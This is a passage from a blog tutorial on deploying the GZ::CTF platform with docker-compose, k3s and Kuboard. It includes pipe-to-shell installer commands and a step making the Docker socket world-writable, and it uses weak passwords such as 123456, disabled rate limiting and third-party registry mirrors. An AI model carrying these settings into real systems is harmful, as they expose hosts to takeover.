yaml"><figcaption><span>title:"kubeconfig"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tL....</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://127.0.0.1:6443</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">preferences:</span> &#123;&#125;</span><br><span class="line"><span class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">client-certificate-data:</span> <span class="string">LS0tL....</span></span><br><span class="line">    <span class="attr">client-key-data:</span> <span class="string">LS0tLS....</span></span><br></pre></td></tr></table></figure><p>For the <code>ApiServer地址</code> position, we need to input the k3s server ip, <code>kuboard</code> and <code>k3s</code> is the same vps in this case, so just set below:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://192.168.0.195:6443</span><br></pre></td></tr></table></figure><p><strong>Finally</strong>,  we bound k3s to kuboard, the last operation is to set the access rule of  k3s like below picture.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f424cd5a67982f32102ba9f953fa9a30.png"></p><h3 id="GZCTF-Deployment"><a href="#GZCTF-Deployment" class="headerlink" title="GZCTF Deployment"></a>GZCTF Deployment</h3><p>GZCTF frontend platform deployed by <code>docker-compose</code>.  The main file is docker-compose.yml, but it depends on <code>appsettings.json</code> and <code>kube-config.yaml</code>. So there are three file we need to create and config, structure like below.</p><figure class="highlight plaintext"><figcaption><span>title:"create basic env"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/gzctf</span><br><span class="line">cd ~/gzctf</span><br><span class="line">tree .               </span><br><span class="line">.</span><br><span class="line">├── appsettings.json</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">└── kube-config.yaml</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure><p>Docker is necessary to build it, so we install <code>docker</code> first:</p><figure class="highlight bash"><figcaption><span>title:"docker install"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Install docker</span></span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line"><span class="comment">## Optional, make docker/docker-compose command don&#x27;t need sudo at the beginning anymore. </span></span><br><span class="line"><span class="comment">## It&#x27;s troublesome to always input the password :x</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo <span class="built_in">chmod</span> a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>For the same reason of network, we need to set image proxy config. Just run the below shell script.  The brand new third-party proxy address is illustrated by here: <a href="https://www.cnblogs.com/alex-oos/p/18417200">https://www.cnblogs.com/alex-oos/p/18417200</a>.</p><figure class="highlight shell"><figcaption><span>title</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;:[</span><br><span class="line">  &quot;https://hub.xdark.top&quot;,</span><br><span class="line">  &quot;https://hub.littlediary.cn&quot;,</span><br><span class="line">  &quot;https://cjie.eu.org&quot;,</span><br><span class="line">  &quot;https://docker.1panel.live&quot;,</span><br><span class="line">  &quot;https://docker.unsee.tech&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>Then we need to config the three necessary files, let’s config them one by one.  All my configrations refers to  <a href="https://gzctf.gzti.me/guide/start/quick-start.html">Quick Start - GZ::CTF</a> .</p><p>Firstly, the <code>docker-compose.yml</code> is the main file to build the gzctf platform. Below is my configration:</p><figure class="highlight yml"><figcaption><span>title:"docker-compose.yml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-shanghai.aliyuncs.com/gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=123456&quot;</span></span><br><span class="line">      <span class="comment">## choose your backend language `en_US` / `zh_CN` / `ja_JP`</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span> <span class="comment">## this is required for k8s deployment</span></span><br><span class="line">      <span class="comment">## - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; ## this is required for docker deployment</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cache</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=password_here&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><p>The <code>appsettings.json</code> shows the basic configration of GZ::CTF paltform, such as database address, public entry, etc.</p><figure class="highlight json"><figcaption><span>title:appsettings.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=password_here&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SenderAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SenderName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">587</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JasperSecretKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kubernetes&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192.168.0.195&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>kube-config.yaml</code> is used to build a brige between gzctf platform (frontend) and k3s clusters (backend). Just copy the contents of <code>/etc/rancher/k3s/k3s.yaml</code> in k3s vps and change the <code>server</code> properties to <code>ApiServer地址</code> we set before.</p><figure class="highlight yaml"><figcaption><span>title:"kube-config.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tLS...</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://192.168.0.195:6443</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">preferences:</span> &#123;&#125;</span><br><span class="line"><span class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">client-certificate-data:</span> <span class="string">LS0tLS1...</span></span><br><span class="line">    <span class="attr">client-key-data:</span> <span class="string">LS0tLS1...</span></span><br></pre></td></tr></table></figure><p><strong>Finally</strong>,  run <code>docker-compose up -d</code> in your gzctf directory of gzpaltform vps, and visit to your vps ip then you will see the paltform has been built if the command run successfully. For example I visit to <code>http://192.168.0.100</code> and I will see below:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3eaa4cf77aa94f8069fccbca72781c2e.png"><br>Default username is <code>Admin</code> and password has been set in <code>docker-compose.yml</code>. For me it’s <code>123456</code>.</p><h3 id="Challenges-Deployment"><a href="#Challenges-Deployment" class="headerlink" title="Challenges Deployment"></a>Challenges Deployment</h3><p>If we want to use gz platform api to pull images and run our challenges automatically,  a standard docker container templates is required. Fortunately, official document give us two repo, the <code>GZCTF-Challenges</code> shows basic dynamic container challenge templates and the <code>W4terCTF-2023</code> has provided pre-configured images for challenges deployment.</p><p>official docker templates address: </p><ul><li><a href="https://github.com/GZTimeWalker/GZCTF-Challenges">https://github.com/GZTimeWalker/GZCTF-Challenges</a></li><li><a href="https://github.com/W4terDr0p/W4terCTF-2023">https://github.com/W4terDr0p/W4terCTF-2023</a></li></ul><p>For example,  I wanna use a web challenges like <code>Help Newnew Find Flag</code>，got the inner service port in file <code>challenges/web/help-new-new-find-flag/README.md</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2188b51907ff09f7e3ea8eb62a1eca75.png"></p><p>Then visit the packages to get the docker images url: <a href="https://github.com/orgs/W4terDr0p/packages?repo_name=W4terCTF-2023">Packages · W4terDr0p</a><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/e3228fcec91239ea8194abf3f0725349.png"></p><p>got the docker image address and pull it:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/0d3f8ccff5b90477e0bfd91890a42bb4.png"></p><p>Finally, set docker image url and expose port we check before .You’ll able to visit the challenge service if everything  correct.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d238e5ffee6a6d2eceb6d015f210a192.png"></p><p>Service will open on k3s vps, but NOTICE use <code>docker ps -a</code> can’t see the challenges container, you need to use <code>Kuboard</code>.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8449be01991f518ab6e12bcebd719d3c.png"></p><h2 id="Remote-deployment"><a href="#Remote-deployment" class="headerlink" title="Remote deployment"></a>Remote deployment</h2><p>Asset Topology：</p><ul><li>aaa.aaa.aaa.aaa: for GZCTF platform deployment (frontend)，OS: ubuntu 20.04</li><li>bbb.bbb.bbb.bbb : for  k3s container cluster deployment (backend) ，OS ubuntu 20.04</li></ul><h3 id="k3s-deployment"><a href="#k3s-deployment" class="headerlink" title="k3s deployment"></a>k3s deployment</h3><p><strong><code>k3s</code> installation：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Domestic</span><br><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -</span><br><span class="line">## Foreign</span><br><span class="line">curl -sfL https://get.k3s.io | sh -</span><br><span class="line">## check the installation</span><br><span class="line">k3s -v</span><br></pre></td></tr></table></figure><p>modify proxy config to make sure pull images successfully. File address:  <code>/etc/rancher/k3s/registries.yaml</code> </p><figure class="highlight yaml"><figcaption><span>title:"/etc/rancher/k3s/registries.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mirrors:</span></span><br><span class="line">  <span class="attr">&quot;docker.io&quot;:</span></span><br><span class="line">    <span class="attr">endpoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.littlediary.cn&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.xdark.top&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://cjie.eu.org&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.1panel.live&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.unsee.tech&quot;</span></span><br></pre></td></tr></table></figure><p>As same, If we want to use Kuboard, we should install <code>docker</code> and <code>docker-compose</code> first.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">## Install docker-compose</span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">## Install docker</span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line">## Optional, make docker/docker-compose command don&#x27;t need sudo at the beginning anymore. </span><br><span class="line"></span><br><span class="line">## It&#x27;s troublesome to always input the password, let make it blow up :(</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>next, install <code>Kuboard</code>. Actually, Code block below just pull a docker image and  run a web container.  </p><p>Just try <code>chmod +x run_kuboard.sh &amp;&amp; ./run_kuboard.sh</code> command to  run the below shell script.</p><p>NOTICE: <code>KUBOARD_BASE_URL</code>  need to change to your own k3s vps, for me it’s <code>http://192.168.0.195</code></p><figure class="highlight shell"><figcaption><span>title:"run_kuboard.sh"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Run the Docker container</span></span></span><br><span class="line">docker run -d \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  --name=kuboard \</span><br><span class="line">  -p 3271:80/tcp \</span><br><span class="line">  -p 10081:10081/tcp \</span><br><span class="line">  -e KUBOARD_ENDPOINT=&quot;bbb.bbb.bbb.bbb:3271&quot; \</span><br><span class="line">  -e KUBOARD_AGENT_SERVER_TCP_PORT=&quot;10081&quot; \</span><br><span class="line">  -v /root/kuboard-data:/data \</span><br><span class="line">  swr.cn-east-2.myhuaweicloud.com/kuboard/kuboard:v3</span><br></pre></td></tr></table></figure><p>then visit address: <a href="http://bbb.bbb.bbb.bbb:3271/">http://bbb.bbb.bbb.bbb:3271</a> to see kuboard login page: （count: <code>admin/Kuboard123</code>）<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/20250402190237.png"></p><p>Then we add a cluster to bound to k3s, and set ServerApi to ensure gzctf-frontend could access backend.</p><p><strong>NOTICE</strong>: <code>kubeconfig</code> completely copy the content of <code>/etc/rancher/k3s/k3s.yaml</code>, and ApiServer should change ip to public ip like <code>https://bbb.bbb.bbb.bbb:6443</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/20250402190341.png"></p><p>finally, chose you user role like below:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/300acf6ff7cd24d76663e894b85d1b43.png"></p><h3 id="gzctf-deployment"><a href="#gzctf-deployment" class="headerlink" title="gzctf deployment"></a>gzctf deployment</h3><p>As we know, we need three file to build a frontend: <code>docker-compose.yml</code>, <code>appsettings.json</code>, <code>kube-config.yaml</code> .</p><figure class="highlight yml"><figcaption><span>title:"docker-compose.yml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-shanghai.aliyuncs.com/gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=123456&quot;</span></span><br><span class="line">      <span class="comment">## choose your backend language `en_US` / `zh_CN` / `ja_JP`</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span> <span class="comment">## this is required for k8s deployment</span></span><br><span class="line">      <span class="comment">## - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; ## this is required for docker deployment</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cache</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=password_here&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><p>NOTICE: change PublicEntry to backend server ip: <code>&quot;PublicEntry&quot;: &quot;bbb.bbb.bbb.bbb&quot;</code></p><figure class="highlight json"><figcaption><span>title:"appsettings.json"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=password_here&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SenderAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SenderName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">587</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JasperSecretKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kubernetes&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span 